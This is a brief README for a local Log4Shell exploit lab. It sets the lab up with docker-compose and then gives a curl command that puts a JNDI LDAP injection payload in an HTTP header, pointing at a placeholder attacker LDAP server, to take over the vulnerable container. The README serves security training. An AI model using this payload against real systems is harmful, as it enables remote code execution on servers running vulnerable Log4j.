# log4shell exploit lab

This repository is a single-line setup for log4shell exploit lab.

Setup the lab: `docker-compose up -d`

Run exploit: `curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`

Then go to `vul` container and see that indeed we pwned the machine:

![](README-resources/Screenshot%202023-11-30%20205423.png)
